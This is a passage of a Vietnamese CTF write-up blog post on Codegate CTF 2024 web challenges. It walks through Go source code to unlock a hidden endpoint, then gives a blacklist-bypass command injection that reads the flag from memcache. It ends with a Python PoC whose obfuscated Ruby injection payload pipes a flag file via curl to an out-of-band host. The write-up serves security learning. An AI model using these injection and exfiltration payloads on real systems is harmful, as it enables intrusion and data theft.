+		err := db.QueryRow(&quot;SELECT username FROM register WHERE session = $1&quot;, data.Session).Scan(&amp;username)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 2 err ==&gt; %v\n&quot;, err)
+		}
+		return username
+	case 3:
+		var username_flag string
+		err := db.QueryRow(&quot;SELECT count(username) FROM register WHERE username = $1&quot;, data.Id).Scan(&amp;username_flag)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 3 err ==&gt; %v\n&quot;, err)
+		}
+		return username_flag
+	case 4:
+		var session_enable_flag string
+		err := db.QueryRow(&quot;SELECT count(session_enable) FROM register WHERE username = $1 and (session_enable=0 or session_enable=-1)&quot;, data.Id).Scan(&amp;session_enable_flag)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 4 err ==&gt; %v\n&quot;, err)
+		}
+		return session_enable_flag
+	case 5:
+		var session_compare_flag string
+		err := db.QueryRow(&quot;SELECT count(session) FROM register WHERE username = $1 and session = $2&quot;, data.Id, data.Session).Scan(&amp;session_compare_flag)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 5 err ==&gt; %v\n&quot;, err)
+		}
+		return session_compare_flag
+	case 6:
+		var persistence_flag string
+		err := db.QueryRow(&quot;SELECT count(username) FROM register WHERE session = $1 and session_enable=1 and username=$2&quot;, data.Session, data.Id).Scan(&amp;persistence_flag)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 6 err ==&gt; %v\n&quot;, err)
+		}
+		return persistence_flag
+	case 7:
+		var hidden_flag string
+		err := db.QueryRow(&quot;SELECT hidden_open FROM register WHERE username=$1&quot;, data.Id).Scan(&amp;hidden_flag)
+		if err != nil {
+			fmt.Printf(&quot;Checker Case 7 err ==&gt; %v\n&quot;, err)
+		}
+		fmt.Printf(&quot;hidden_flag : %v\n&quot;, hidden_flag)
+
+		return hidden_flag
+	}
+	return &quot;NULL&quot;
+}
+</code></pre><ul>
+<li>Ta có thể thấy nếu case là 7 thì tạo một biến hidden_flag là string -&gt; truy vấn mysql db ra bản ghi của hidden_open từ bảng register với username là id của user tạo từ struct được truyền vào.</li>
+</ul>
+<p>-&gt; trả về hidden_flag -&gt; quay trở lại với flow chính lúc này gán hidden_flag là flag và nếu flag=1 thì ta có thể truy cập 2 method get và post và để ý post thì ta sẽ hiển thị được trang và post các giá trị đã được phân tích trên flag server.</p>
+<ul>
+<li>Vậy thì để access đến nó tiếp tục ta cần để flag trả ra 1 đồng nghĩa là hidden_open trong bảng register có giá trị là 1.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rykBzzUBC.png" alt="image"></p>
+<ul>
+<li>Có thể thấy đây là các nơi có thể thấy thông tin để truy cập vào colum này nó nằm trong bảng register :</li>
+</ul>
+<pre><code>func CreateRegisterTable(db *sql.DB) {
+    createTableQuery := `
+    CREATE TABLE IF NOT EXISTS register (
+        id SERIAL PRIMARY KEY, 
+        username VARCHAR(50) NOT NULL,
+		password VARCHAR(50) NOT NULL,
+        session VARCHAR(50) UNIQUE,
+        session_enable int DEFAULT 0,
+        hidden_open     int DEFAULT 0
+    );`
+    _, err := db.Exec(createTableQuery)
+    if err != nil {
+        fmt.Println(&quot;[1] Create register table was failed&quot;)
+        log.Fatal(err)
+    }
+    fmt.Println(&quot;Register table created successfully&quot;)
+}
+</code></pre><ul>
+<li>Và giá trị default của nó là 0.</li>
+<li>Tiếp theo là một hàm để thay đổi giá trị 0 or 1 của nó ở đây:</li>
+</ul>
+<pre><code>func Hidden(db *sql.DB, data structure.User, flag int) {
+	updateQuery := `
+    UPDATE register 
+    SET hidden_open=1
+    WHERE username=$1
+    `
+
+	updateQuery2 := `
+    UPDATE register 
+    SET hidden_open=0
+    WHERE username=$1
+    `
+
+	if flag == 1 {
+		stmt, err := db.Prepare(updateQuery)
+		if err != nil {
+			log.Printf(&quot;Error preparing updateQuery: %v\n&quot;, err)
+			fmt.Printf(&quot;[HiddenOpen #1] Error preparing updateQuery: %v\n&quot;, err)
+		}
+
+		defer stmt.Close()
+		fmt.Printf(&quot;[HiddenOpen #1] username : %v\n&quot;, data.Id)
+
+		_, err = stmt.Exec(data.Id)
+		if err != nil {
+			fmt.Printf(&quot;Error executing updateQuery : %v\n&quot;, err)
+		}
+	}
+	if flag == 0 {
+		stmt, err := db.Prepare(updateQuery2)
+		if err != nil {
+			log.Printf(&quot;Error preparing updateQuery: %v\n&quot;, err)
+			fmt.Printf(&quot;[HiddenOpen #2] Error preparing updateQuery: %v\n&quot;, err)
+		}
+
+		defer stmt.Close()
+		fmt.Printf(&quot;[HiddenOpen #2] username : %v\n&quot;, data.Id)
+
+		_, err = stmt.Exec(data.Id)
+		if err != nil {
+			fmt.Printf(&quot;Error executing updateQuery : %v\n&quot;, err)
+		}
+	}
+
+}
+
+</code></pre><ul>
+<li>Hàm Hidden được sử dụng trong hàm :</li>
+</ul>
+<pre><code>func ValidateHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
+	var count int
+	fmt.Println(&quot;[ValidateHandler] Entrance&quot;)
+
+	if r.Method != http.MethodPost {
+		http.Error(w, &quot;Method Not Allowed&quot;, http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, &quot;Failed to read request body&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;Error reading request body: %v\n&quot;, err)
+		return
+	}
+	data := structure.AddRoomInfo{
+		Username:      &quot;NULL&quot;,
+		ChatRoomIndex: 0,
+	}
+
+	err = json.Unmarshal(body, &amp;data)
+
+	if err != nil {
+		http.Error(w, &quot;Failed to unmarshal request body&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;Error unmarshaling request body: %v\n&quot;, err)
+		return
+	}
+
+	data2 := structure.User{
+		Id: data.Username,
+	}
+
+	count = reg.IsValidRoomManage(db, data)
+
+	var response structure.CheckRoomCount
+
+	response.ChatRoomCount = count
+
+	if count &gt;= 0 &amp;&amp; count &lt;= 9 {
+		reg.Hidden(db, data2, 0)
+		response.ReturnVal = 1
+		w.WriteHeader(http.StatusOK)
+	}
+	if count == 10 {
+		reg.Hidden(db, data2, 0)
+		response.ReturnVal = -1
+		w.WriteHeader(http.StatusOK)
+	}
+	if count &gt; 10 {
+		reg.Hidden(db, data2, 1)
+		response.ReturnVal = 2
+		w.WriteHeader(http.StatusOK)
+	}
+
+	jsonResponse, err := json.Marshal(response)
+	if err != nil {
+		http.Error(w, &quot;Failed to marshal response&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;Error marshaling response: %v\n&quot;, err)
+		return
+	}
+
+	w.Header().Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+	w.Write(jsonResponse)
+}
+</code></pre><ul>
+<li>Và cuối cùng hàm <code>ValidateHandler</code> được gọi trong api/validate:</li>
+</ul>
+<pre><code>r.HandleFunc(&quot;/api/validate&quot;, func(w http.ResponseWriter, r *http.Request) {
+		ValidateHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+</code></pre><ul>
+<li>api này sẽ gọi <code>count = reg.IsValidRoomManage(db, data)</code> data là id của người dùng mình đang đăng nhập.</li>
+</ul>
+<pre><code>func IsValidRoomManage(db *sql.DB, data structure.AddRoomInfo) int {
+	var count int
+
+	fmt.Printf(&quot;[IsValidRoomManage] Entrance\n&quot;)
+
+	roomValidationQuery := `
+    SELECT COUNT(room_id)
+    FROM chat 
+    WHERE room_session = (SELECT session from register where username=$1)
+    `
+	stmt, err := db.Prepare(roomValidationQuery)
+	if err != nil {
+		fmt.Printf(&quot;Error occured :%v\n&quot;, err)
+		return -1
+	}
+	defer stmt.Close()
+
+	err = stmt.QueryRow(data.Username).Scan(&amp;count)
+	if err != nil &amp;&amp; err != sql.ErrNoRows {
+		fmt.Printf(&quot;Error querying : %v\n&quot;, err)
+		return -1
+	} else {
+		return count
+	}
+}
+</code></pre><ul>
+<li>method này sẽ kiểm tra xem số lượng room_id từ bảng chat với room_session là khóa ngoại được liên kết từ session của bảng register với người dùng hiện tại. Sau đó sẽ trả tra count -&gt; sau đó tiến hành kiểm tra:</li>
+</ul>
+<pre><code>response.ChatRoomCount = count
+
+	if count &gt;= 0 &amp;&amp; count &lt;= 9 {
+		reg.Hidden(db, data2, 0)
+		response.ReturnVal = 1
+		w.WriteHeader(http.StatusOK)
+	}
+	if count == 10 {
+		reg.Hidden(db, data2, 0)
+		response.ReturnVal = -1
+		w.WriteHeader(http.StatusOK)
+	}
+	if count &gt; 10 {
+		reg.Hidden(db, data2, 1)
+		response.ReturnVal = 2
+		w.WriteHeader(http.StatusOK)
+	}
+
+	jsonResponse, err := json.Marshal(response)
+	if err != nil {
+		http.Error(w, &quot;Failed to marshal response&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;Error marshaling response: %v\n&quot;, err)
+		return
+	}
+
+	w.Header().Set(&quot;Content-Type&quot;, &quot;application/json&quot;)
+	w.Write(jsonResponse)
+
+</code></pre><ul>
+<li>Như ta đã thấy thì để hidden_open được set bằng 1 thì sẽ phải được truyền tham số flag là 1 với <code>updateQuery</code>  <code>UPDATE register  SET hidden_open=1 WHERE username=$1</code> -&gt; vậy nên count phải &gt; 10 <code>if count &gt; 10 { reg.Hidden(db, data2, 1) response.ReturnVal = 2 w.WriteHeader(http.StatusOK) }</code></li>
+</ul>
+<p>-&gt; tiếp theo thì làm sau để <code>count &gt; 10</code> thì count ở đây là số lượng <code>room_id</code> thì chỉ có hàm:</p>
+<pre><code>func AddRoom(db *sql.DB, data structure.AddRoomInfo) int {
+	var tmp string
+	tmp = &quot;ROOM_&quot;
+	tmp += fmt.Sprintf(&quot;%d&quot;, data.ChatRoomIndex)
+
+	if data.IsReload == 1 {
+		fmt.Println(&quot;=====================================&quot;)
+		return 1
+	}
+	fmt.Println(&quot;*************************************&quot;)
+
+	insertChatMessageQuery := `
+    INSERT INTO chat(user_id, room_id, room_session, created_at) 
+    VALUES (
+        (select id from register where username=$1),
+        ($2),
+        (select session from register where username=$1),
+        CURRENT_TIMESTAMP 
+    )
+    `
+	_, err := db.Exec(insertChatMessageQuery, data.Username, tmp)
+	if err != nil {
+		log.Printf(&quot;Error inserting new member: %v\n&quot;, err)
+		fmt.Printf(&quot;Error inserting new member: %v\n&quot;, err)
+		return 0
+	}
+	return 1
+}
+
+
+</code></pre><ul>
+<li>Mới có thể tiến hành thêm mới <code>room_id</code> và nó nằm ở api/addRoom :</li>
+</ul>
+<pre><code>r.HandleFunc(&quot;/api/addRoom&quot;, func(w http.ResponseWriter, r *http.Request) {
+		AddRoomHandler(w, r, db)
+	}).Schemes(&quot;http&quot;)
+</code></pre><ul>
+<li>
+<p>Đây là schema của bảng : <code>CREATE TABLE IF NOT EXISTS chat ( no SERIAL PRIMARY KEY, user_id INT REFERENCES register(id), room_id VARCHAR(50), room_session VARCHAR(50) REFERENCES register(session), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP );</code></p>
+</li>
+<li>
+<p>Gọi đến AddRoomHandler:</p>
+</li>
+</ul>
+<pre><code>func AddRoomHandler(w http.ResponseWriter, r *http.Request, db *sql.DB) {
+	fmt.Printf(&quot;[AddRoomHandler] Entrance\n&quot;)
+
+	if r.Method != http.MethodPost {
+		http.Error(w, &quot;Method Not Allowed&quot;, http.StatusMethodNotAllowed)
+		return
+	}
+
+	body, err := ioutil.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, &quot;Failed to read request body&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;Error reading request body: %v\n&quot;, err)
+		return
+	}
+	data := structure.AddRoomInfo{
+		Username:      &quot;NULL&quot;,
+		ChatRoomIndex: 0,
+		IsReload:      -1,
+	}
+	err = json.Unmarshal(body, &amp;data)
+
+	if err != nil {
+		http.Error(w, &quot;Failed to unmarshal request body&quot;, http.StatusInternalServerError)
+		fmt.Printf(&quot;[AddRoomHandler] Error unmarshaling request body: %v\n&quot;, err)
+		return
+	}
+	reg.AddRoom(db, data)
+}
+</code></pre><ul>
+<li>
+<p>Thì hàm này cơ bản là sẽ thêm mới room vào bảng thôi.</p>
+</li>
+<li>
+<p>Oke thì đó là các chain của bài này.</p>
+</li>
+</ul>
+<h3 id="flow--exploit">Flow + exploit</h3>
+<ul>
+<li>
+<p>Đầu tiên sẽ register -&gt; login -&gt; add root với /api/addRoom để nhiều hơn 10 room -&gt; truy cập /api/hidden -&gt; post username + password + command -&gt; flask server.</p>
+</li>
+<li>
+<p>Như đã phân tích ở trên flask server thì ta truyền vào command thì nó sẽ thực hiện command và flag được lưu trong memcache server ở 11211.
+<img src="https://hackmd.io/_uploads/rkE5sG8BR.png" alt="image"></p>
+</li>
+<li>
+<p>Bypass black-list : dùng bypass cơ bản dùng <code>admin:%3A%F2F%2Fid;mem&quot;&quot;cat&quot;&quot; --server=localhost+flag</code></p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Sy90HcuEC.png" alt="image"></p>
+<p>Flag: <code>codegate2024{Important_DATA_DO_NOT_SAVE_IN_MEMCACHE}</code></p>
+<ul>
+<li>Có một bài cũng giải tương tự ở đây: <a href="https://siunam321.github.io/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service/">https://siunam321.github.io/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service/</a></li>
+</ul>
+<h2 id="master_of_calculator">Master_of_calculator</h2>
+<p>poc :</p>
+<pre><code>
+import requests
+
+url = 'http://3.34.253.4:3000/calculate_fee'
+
+payload = &quot;&quot;&quot;
+slash = 47.chr;
+space = 32.chr;
+pipe = 124.chr;
+curl = 99.chr + 117.chr + 114.chr + 108.chr;
+dash = 45.chr;
+bigx = 88.chr;
+post = 80.chr + 79.chr + 83.chr + 84.chr;
+dashd = dash + 100.chr;
+pipe = 124.chr;
+cat = 99.chr + 97.chr + 116.chr;
+r = 114.chr;
+flagfile = slash + 114.chr + 97.chr + 105.chr + 108.chr + 115.chr + slash + 102.chr + 108.chr + 97.chr + 103.chr + 45.chr + 49.chr + 57.chr + 101.chr + 54.chr + 99.chr + 102.chr + 50.chr + 102.chr + 99.chr + 102.chr + 101.chr + 100.chr + 52.chr + 55.chr + 56.chr + 49.chr + 98.chr + 55.chr + 99.chr + 53.chr + 52.chr + 97.chr + 55.chr + 99.chr + 97.chr + 51.chr + 97.chr + 98.chr + 54.chr + 55.chr + 100.chr + 100.chr;
+ooblink = 104.chr + 116.chr + 116.chr + 112.chr + 58.chr + 47.chr + 47.chr + 108.chr + 97.chr + 100.chr + 120.chr + 98.chr + 114.chr + 113.chr + 107.chr + 99.chr + 99.chr + 99.chr + 110.chr + 111.chr + 99.chr + 110.chr + 102.chr + 111.chr + 122.chr + 107.chr + 100.chr + 57.chr + 122.chr + 117.chr + 121.chr + 119.chr + 118.chr + 56.chr + 52.chr + 122.chr + 120.chr + 110.chr + 105.chr + 57.chr + 46.chr + 111.chr + 97.chr + 115.chr + 116.chr + 46.chr + 102.chr + 117.chr + 110.chr;
+
+read =  cat + space + flagfile + space + pipe + space + curl + space + dash + bigx + space + post + space + ooblink + space + dashd + space + 64.chr + 45.chr;
+
+open pipe + read, r
+&quot;&quot;&quot;
+data = {
+    'user_entry_price': &quot;1;&quot; + payload.replace('\n', ' '),
+    'user_exit_price': '2',
+    'user_leverage': '1',
+    'user_quantity': '1'
+}
+
+response = requests.post(url, data=data)
+
+print(response.text)
+</code></pre>
+
+        
+          <div class="blog-tags">
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
+            
+              
+              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
+            
+          </div>
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://l3mnt2010.github.io/write-up/2025-04-17-codegatectf2025quals/" data-toggle="tooltip" data-placement="top" title="CodegateCTF 2025 quals">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://l3mnt2010.github.io/write-up/2023-08-19-bksecctf2023/" data-toggle="tooltip" data-placement="top" title="BKSEC-CTF-2023 - WEB &#39;s challenges">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      <footer>
+  <div class="container">
+    
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            0001
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
